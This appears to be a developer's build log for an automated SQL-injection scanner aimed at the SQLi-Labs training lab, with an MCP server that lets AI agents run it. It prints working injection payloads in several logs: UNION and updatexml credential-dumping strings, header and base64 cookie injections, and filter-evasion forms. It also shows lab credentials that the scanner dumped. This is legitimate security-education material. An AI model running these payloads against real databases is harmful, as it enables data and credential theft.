# Universal SQLi Agent: Build Logs

A working log of the ten moments that actually shaped this project. Not every commit. Not every dead end. Just the points where something broke, something clicked, or my mental model had to change. Some of this happened inside Gemini CLI before I had ever heard of OpenCode; some of it happened weeks later in a fresh WSL2 install.

---

## Log 01: Picking a target and committing to black-box rules

The very first decision was whether to read SQLi-Labs' PHP source. The lessons are open source. I could have spent half an hour reading `Less-1/index.php` and known every closure character before I wrote a single Python line.

I chose not to.

The reason was practical, not purist. A scanner that only works when you can read the server is a scanner that only works in lab. I wanted something I could later point at a real target and have it figure out the same things from the outside. So the constraint went into my notes early, written exactly this way:

> No access to server-side source code. All logic is evidence-based.

That single sentence is why the scanner has the shape it has. Every detection method later in this log comes back to "what does the response actually look like" rather than "what does the code say it should do."

---

## Log 02: The 502 that wasn't a server problem

Before any injection ever fired, I tried the most boring command I could think of:

```
curl.exe http://172.17.59.5/
```

The response was instant and wrong:

```
HTTP/1.1 502 Bad Gateway
Connection: keep-alive
Keep-Alive: timeout=4
Proxy-Connection: keep-alive
Content-Length: 0
```

`Process Group PGID: 16780`, recorded in `core/ai_tool_dev_convo.json` line 986. I did the obvious thing and pinged the host:

```
Reply from 172.17.59.5: bytes=32 time=1ms TTL=64
```

Network is fine. Container is up. So why the 502?

Adding `-v` answered that immediately:

```
* Uses proxy env variable http_proxy == 'http://127.0.0.1:7897'
*   Trying 127.0.0.1:7897...
* Connected to 127.0.0.1 (127.0.0.1) port 7897
> GET http://172.17.59.5/ HTTP/1.1
> Host: 172.17.59.5
> Proxy-Connection: Keep-Alive
```

A VPN client on the Windows host had set `http_proxy=http://127.0.0.1:7897` system-wide. Every outbound HTTP request, including requests to a docker bridge address that lives one logical hop from my own machine, was being shipped to a SOCKS proxy that had no idea what to do with `172.17.59.5`. The proxy gave up and sent back 502.

The fix in shell was `--noproxy "*"`:

```
curl.exe -v --noproxy "*" http://172.17.59.5/Less-1/?id=1
< HTTP/1.1 200 OK
< Server: Apache/2.4.7 (Ubuntu)
```

The fix in code, which is what stuck, was two changes that get repeated everywhere `requests` is used. From `core/sqli_final.py`:

```python
self.session = requests.Session()
self.session.trust_env = False  # ignore the system http_proxy env var
```

and on every direct call:

```python
requests.get(setup_url, proxies={"http": None, "https": None}, timeout=10)
```

The lesson stuck. I now check the verbose flag before I check my own code, every single time.

---

## Log 03: `gemini1`, `gemini2`, `gemini3`: how the scanner actually decides a column reflects

The core of the UNION detector is unglamorous. You send the database three values and check whether they appear in the rendered HTML. The trick is choosing values that cannot already be on the page.

I almost used the integers 1, 2, 3. That was a mistake I caught before I committed it. Look at any PHP error page or Apache directory index and you will find the digit "2" sitting there. A reflection check on `2` returns true even when the injection failed.

The fix uses uniquely improbable strings, hex-encoded to skip quote handling:

```python
markers = [f"gemini{i}" for i in range(1, col_count + 1)]
marker_cols = ",".join([f"0x{m.encode().hex()}" for m in markers])
payload_str = f"{closure} UNION SELECT {marker_cols}"
```

For three columns this produces:

```
?id=-1' UNION SELECT 0x67656d696e6931,0x67656d696e6932,0x67656d696e6933-- -
```

Which MySQL evaluates to literal strings `gemini1`, `gemini2`, `gemini3`. Then the detector reads the HTML and asks a clean question:

```python
reflected_indices = []
for i in range(1, col_count + 1):
    if f"gemini{i}" in r.text:
        reflected_indices.append(i)
```

The string `gemini2` does not appear in stack traces, in error pages, in Apache defaults, or anywhere else on the open internet that I am aware of. The detector cannot lie to itself about a hit. Reflected indices `[2, 3]` mean exactly what they claim to mean.

This is also why hex encoding matters. Putting `gemini1` directly into the UNION as a quoted string would force the scanner to think about closure-aware quoting in the payload itself. Hex-encoding sidesteps that whole branch, MySQL accepts `0x67656d696e6931` as a string literal regardless of what closure character we are dealing with.

---

## Log 04: The Surgical Flush idea (and the `0x7e` tilde that makes it work)

Once UNION worked, I had to decide what the scanner would actually exfiltrate. The first version dumped `concat(database(),0x3a,user(),0x3a,version())`. That was schema-independent and worked on every lesson, but only gave you metadata. After re-reading a Chinese SQLi-Labs walkthrough on cnblogs ([liigceen/p/18555978](https://www.cnblogs.com/liigceen/p/18555978)) I switched to a full credential dump using `GROUP_CONCAT`:

```python
extract_sql = "SELECT GROUP_CONCAT(username,0x7e,password) FROM users"
payload_core = f"updatexml(1,concat(0x7e,({extract_sql}),0x7e),1)"
```

The choice of `0x7e` (the tilde character `~`) is the part that took me longest to settle on. It needs to:

- never appear naturally inside the credentials being extracted,
- survive whatever URL encoding the page applies on its way out,
- be easy to find with a regex that I will not later forget.

The matching parser in `check_error_response` reads exactly this:

```python
patterns = [
    r"XPATH syntax error: '.*\\(.*?)\\.*'",
    r"XPATH syntax error: ':(.*?):'",
    r"XPATH syntax error: '~(.*?)~'",
    r"XPATH syntax error: '(.*?)'",
]
```

Four patterns because different versions of MySQL wrap the leaked string in different delimiters (backslash, colon, tilde, bare). The tilde is the one I generate; the others are fallbacks for edge cases I observed during debugging on Lessons 5, 17, and 26.

The output of a successful flush against Lesson 21, recorded by the orchestrator, looks like this:

```
SURGICAL FLUSH FOR LESSON 21
==============================
VULN TYPE: Error-Based
METHOD: COOKIE
PAYLOAD: ') AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x7e,password) FROM users),0x7e),1)-- -

EXTRACTED DATA:
Dumb
```

That `Dumb` is the first row of the `users` table. The full credential dump appears in the same file when the response isn't truncated by the lesson's display logic.

---

## Log 05: Lessons 18 to 22: when the browser is not the injection point

The first run of the scanner against Lessons 18, 19, 20, 21, and 22 returned exactly nothing. The Oracle reported `[-] Less-18 Failed.` for all five.

These lessons are the ones where the SQL injection happens inside an HTTP header, not inside a URL parameter or POST body. The frontend sends `User-Agent`, `Referer`, or a `Cookie` value that the backend then plugs into an `INSERT` statement. A generic GET/POST scanner has no reason to ever touch those headers, so it never sees the injection point.

The fix was a dedicated handler for those five lessons, with payloads tuned to the `INSERT` column shape of each one:

```python
def solve_header_specific(self):
    payload_db = "updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x7e,password) FROM users),0x7e),1)"

    if self.lesson_num == 18:
        payload = f"' , '1' , {payload_db}) #"   # INSERT with three columns
        h = HEADERS.copy(); h['User-Agent'] = payload
        ...
    elif self.lesson_num == 21:
        payload_raw = f"admin') and {payload_db} #"
        payload_b64 = base64.b64encode(payload_raw.encode()).decode()
        req_cookies = {'uname': payload_b64}
        ...
```

Lesson 18's `' , '1' , {payload})` is balancing three columns of an `INSERT INTO uagents` statement. Lessons 21 and 22 wrap the cookie value in `base64_decode()` server-side, so the scanner has to encode before sending. The asymmetry between Lesson 21 (single-quote closure with a paren) and Lesson 22 (double-quote closure) is the kind of detail you cannot guess from a generic fuzzer; you have to build a lesson-shaped payload and let it speak for itself.

The validation log recorded the moment all five worked:

```
[+] Less-18: User-Agent Injection Successful. DB: Dumb~Dumb,Angelina~I-kill-you,...
[+] Less-19: Referer Injection Successful. DB: Dumb~Dumb,Angelina~I-kill-you,...
[+] Less-20: Cookie Injection Successful. DB: Dumb~Dumb,Angelina~I-kill-you,...
[+] Less-21: Cookie Injection (B64) Successful. DB: Dumb~Dumb,Angelina~I-kill-you,...
[+] Less-22: Cookie Injection (B64-DQ) Successful. DB: Dumb~Dumb,Angelina~I-kill-you,...
```

The `B64` and `B64-DQ` tags in the log are the clearest evidence the lesson-specific code path mattered. A generic header fuzzer cannot produce those tags because it has no concept of "this lesson uses base64 with a parenthesised single-quote closure."

---

## Log 06: `payloads.txt` as the artifact that actually leaves the lab

The scanner produces three artifacts per run: a `scan_results.txt` that summarises what was found, a `payloads.txt` that contains weaponised exploitation payloads, and now a `vulnerability_profile.json` that the AI tutor reads. The most useful of the three has turned out to be `payloads.txt`, because it is the one I can hand to a human pentester and have them reproduce the result without running the scanner at all.

A sample of what the file looks like in production (from the `tutor_dev_convo.json` archive):

```
[Less-1 GET UNION (Full Flush)]
http://172.17.59.5/Less-1/?id=-1' UNION SELECT null,GROUP_CONCAT(username),GROUP_CONCAT(password) FROM users-- -

[Less-21 Cookie B64 (Burp Compatible)]
Cookie: uname=YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKFNFTEVDVCBHUk9VUF9DT05DQVQodXNlcm5hbWUsMHg3ZSxwYXNzd29yZCkgRlJPTSB1c2VycyksMHg3ZSksMSkgIw==
Decoded: admin') and updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x7e,password) FROM users),0x7e),1) #

[Less-26 GET ERROR]
http://172.17.59.5/Less-26/?id=1' && updatexml(1,concat(0x7e,(selselectect GROUP_CONCAT(username,0x7e,password) FROM users),0x7e),1) && '1'='1
```

Two of these are worth pausing on. The Lesson 21 entry stores both the encoded payload and its decoded form, which is what makes it usable in Burp Repeater without round-tripping through a base64 tool. The Lesson 26 entry uses `&&` and `||` instead of `AND`/`OR`, plus the doubled keyword `selselectect` and trailing `'1'='1`, because Lesson 26 strips spaces and standard SQL keywords with `preg_replace`. None of those tamper choices is configurable; they are picked by the tamper detection inside the scanner and then rendered into the payload that gets saved.

The `save_payload` helper does one more thing worth mentioning. Before writing, it un-encodes things the browser will encode anyway:

```python
clean_payload = (
    payload
    .replace("%26%26", "&&")
    .replace("%7C%7C", "||")
    .replace("%0a", " ")
    .replace("%a0", " ")
)
```

That is intentionally lossy. The on-the-wire payload uses `%0a` because the WAF on Lesson 26 strips literal spaces. In `payloads.txt`, the same payload reads as a normal SQL string with whitespace, because the file is meant to be pasted into Burp or HackBar, both of which re-encode spaces themselves. The two views serve two different audiences.

---

## Log 07: From "scanner that prints things" to "scanner that the AI can read"

There was a clear before-and-after in this project, and the line was the introduction of `vulnerability_profile.json`.

Before, the scanner printed lines like:

```
[+] Less-1: GET UNION Injection Found. Cols: 3 | Reflected: [2, 3] | Closure: '
```

That is great for me. It is useless for an AI agent. To know the closure is `'`, the agent would have to parse a sentence with a regex that has to know the exact wording of the print statement. Any rephrasing breaks it.

After, the scanner writes:

```json
{
    "1": {
        "type": "UNION-Based",
        "method": "GET",
        "parameter": "id",
        "closure": "'",
        "tamper": "none",
        "extra": "Cols:3"
    }
}
```

The AI now has structured data with named fields. Asking "what is the closure for Lesson 1" is `profile["1"]["closure"]`. Asking "is this UNION-based" is a string equality check. The whole tutor and orchestrator stack collapses from a fragile parser into a dictionary lookup.

The agent layer reads this through the MCP server, which is itself a thin wrapper:

```python
@mcp.tool()
def oracle_scan(lesson_number: int) -> str:
    cmd = [PYTHON_BIN, str(CORE_DIR / "sqli_final.py"),
           "--lesson", str(lesson_number), "--json", "--no-reset"]
    subprocess.run(cmd, cwd=str(CORE_DIR), capture_output=True, text=True, timeout=120)
    profile_path = CORE_DIR / "vulnerability_profile.json"
    if profile_path.exists():
        with open(profile_path) as f:
            profile = json.load(f)
        lesson_data = profile.get(str(lesson_number))
        if lesson_data:
            return json.dumps(lesson_data, indent=2)
    return json.dumps({"error": f"Lesson {lesson_number} not in profile."})
```

Every claim the AI tutor makes about a lesson now traces back to that JSON file. If the JSON is wrong, the AI is wrong, but it is wrong in a debuggable way, I can read the JSON, run the scanner again, and see what changed.

---

## Log 08: The migration where everything assumed Windows

The project lived on Windows 11 for the first six weeks. The scanner code looked clean enough until I tried to run it on Ubuntu WSL2.

The first thing that broke was the orchestrator. From `core/auto_orchestrator.py` (early version):

```python
SQLMAP_PATH = r"C:\Users\chrom\AppData\Roaming\Python\Python313\Scripts\sqlmap.exe"
ORACLE_SCRIPT = "sqli_final.py"
BASE_URL = "http://172.17.59.5/"
```

Three different Windows assumptions in three lines:

1. The sqlmap binary lives at a Windows-style absolute path.
2. The interpreter lookup assumes the orchestrator runs from the directory containing `sqli_final.py`.
3. The target IP is `172.17.59.5`, which is the Hyper-V Docker bridge on my Windows host. WSL2 puts the same container at `172.18.0.1`.

The Playwright invocation was worse:

```python
subprocess.run(
    f'npx.cmd playwright screenshot "{test_url}" {viz_path}',
    shell=True
)
```

`npx.cmd` does not exist on Linux. `shell=True` plus an embedded URL containing single quotes and SQL keywords means bash will tokenize the URL at the wrong place. I watched it fail with:

```
playwright screenshot: error: unknown option: 'ORDER'
```

bash had taken a fragment of the SQL payload, the literal word `ORDER`, and treated it as a CLI option to playwright.

The fix was `core/config.py`, which became the single source of truth for everything platform-shaped:

```python
PLATFORM   = platform.system().lower()
TARGET_IP  = os.environ.get("TARGET_IP", "172.18.0.1")
SQLMAP_BIN = shutil.which("sqlmap") or "sqlmap"
PYTHON_BIN = sys.executable
BASE_URL   = f"http://{TARGET_IP}/"
```

`shutil.which` finds whatever name resolves on the current platform. `sys.executable` always points at the Python interpreter that's actually running the orchestrator. `TARGET_IP` reads from the environment with `172.18.0.1` as a sane default for WSL2, so going back to Windows means setting `TARGET_IP=172.17.59.5` and changing nothing else.

The Playwright call also got rewritten to a list, which is the correct way to do this regardless of platform:

```python
subprocess.run(
    ["npx", "playwright", "screenshot", test_url, viz_path],
    capture_output=True
)
```

A list bypasses the shell entirely. Each argument is a separate `argv` slot, so SQL operators inside `test_url` are inert. The `ORDER` problem cannot recur.

The startup banner that proves all of this resolved:

```
[config] Platform: linux | Target: 172.18.0.1 | sqlmap: /usr/local/bin/sqlmap
```

That single line, printed every time the config module loads, is what I check first when something stops working on a new machine.

---

## Log 09: sqlmap's shebang and a Python that doesn't exist by name

Once the orchestrator could find sqlmap, sqlmap itself failed at the very first call:

```
/usr/bin/env: 'python': No such file or directory
```

The cause is the first line of `/usr/local/bin/sqlmap`:

```python
#!/usr/bin/env python
```

Ubuntu 22.04 and most modern Debian-derived distros ship `python3` only. There is no executable named `python` on the path unless you explicitly install `python-is-python3`. When the orchestrator launched sqlmap by its absolute path, the kernel honoured the shebang, the shebang asked for `python`, and `env` returned the error above before sqlmap could run a single line.

I considered three fixes:

1. Install `python-is-python3` system-wide. Rejected: changes the host environment in a way that propagates beyond the project.
2. Edit `/usr/local/bin/sqlmap` to say `#!/usr/bin/env python3`. Rejected: gets clobbered the next time sqlmap updates.
3. Bypass the shebang by invoking sqlmap as a script through whatever Python is already running the orchestrator.

Option 3 is the right one and it is now in `core/auto_orchestrator.py`:

```python
# Invoke sqlmap as a script through the active Python interpreter so the
# `#!/usr/bin/env python` shebang in /usr/local/bin/sqlmap does not fail
# on systems that only ship `python3` (Ubuntu 22.04+, WSL2 default).
SQLMAP_INVOKE = [PYTHON_BIN, SQLMAP_PATH]

sqlmap_cmd = SQLMAP_INVOKE + ["-u", f"{BASE_URL}Less-{lesson_num}/?id=1",
                              "--batch", "--dbs", "--proxy", PROXY]
```

`PYTHON_BIN` is `sys.executable`, which is whatever Python the orchestrator itself is running under. The shebang never gets consulted because we are calling Python directly with the sqlmap source file as its first argument. Verified manually:

```
$ python3 /usr/local/bin/sqlmap --version
1.10.4.4#dev
```

A small fix, but a representative one, the project lives across enough binaries that any one of them might fail in a way that has nothing to do with my code.

---

## Log 10: The MCP layer that lets a different AI run the same toolkit

The last big move was untying the project from the AI tool I started with. The first six weeks were on Gemini CLI, where the tutor lived as a dedicated extension at `sqli-tutor-extension/` with a `GEMINI.md` and a `skills/` folder. That worked fine inside Gemini CLI and did not work at all anywhere else.

The MCP rewrite collapsed all of that into three Python functions in `mcp/sqli_mcp.py`:

```python
@mcp.tool()
def oracle_scan(lesson_number: int) -> str:
    """Runs the discovery scanner on the target lesson and returns the vulnerability profile."""
    ...

@mcp.tool()
def browser_test(url: str, payload: str, lesson_id: int) -> str:
    """Uses Playwright Python API to inject a payload and return a surgical DOM summary."""
    ...

@mcp.tool()
def get_lesson_guidance(lesson_number: int) -> str:
    """Returns Socratic teaching guidance for a lesson using the tutor's analysis logic."""
    ...
```

Three tools. JSON in. JSON out. Anything that can speak the Model Context Protocol, OpenCode, Claude Desktop, Cursor, can now drive this toolkit by sending an MCP `tools/call` request. The wire format is plain JSON-RPC 2.0:

```json
{
  "jsonrpc": "2.0",
  "method": "tools/call",
  "params": {
    "name": "oracle_scan",
    "arguments": {"lesson_number": 1}
  },
  "id": 1
}
```

The server is registered in `opencode.json` as a local subprocess:

```json
"sqli-tools": {
    "type": "local",
    "command": [
        "/home/chrom/sqli-universal-agent/venv/bin/python",
        "/home/chrom/sqli-universal-agent/mcp/sqli_mcp.py"
    ]
}
```

The most interesting tool is `get_lesson_guidance`. The Socratic tutor logic was originally a CLI loop in `sqli_tutor.py` that ran `input()` in a `while True`. Wrapping that for MCP took some uncomfortable Python, `importlib` to load the tutor module and `redirect_stdout` to capture its print output as a string:

```python
spec = importlib.util.spec_from_file_location("sqli_tutor", CORE_DIR / "sqli_tutor.py")
tutor = importlib.util.module_from_spec(spec)
spec.loader.exec_module(tutor)

buf = io.StringIO()
with redirect_stdout(buf):
    tutor.provide_guidance(str(lesson_number), result_str, payload_str)

return json.dumps({
    "lesson": lesson_number,
    "vulnerability": result_str,
    "guidance": buf.getvalue()
}, indent=2)
```

That is not how I would write the tutor if I were starting today, the tutor would expose `provide_guidance` as a pure function returning a string, and the MCP wrapper would just call it. But the tutor was already written and tested, and rewriting it would have meant changing code I had high confidence in. The redirect_stdout trick is a one-time bridge between the old shape and the new one. It works, the tests pass, and I can replace it later without touching the MCP interface or the AI agents that depend on it.

---

That is the build, more or less. The thing detects 30 lessons, dumps credentials on the ones it solves, and answers questions about the rest in a form that an AI tutor can use to teach without giving the answer away. The list of things still wrong with it is in `PROJECT_SUMMARY.md`. The list of things I learned from it is in `LEARNING_REFLECTION.md`.
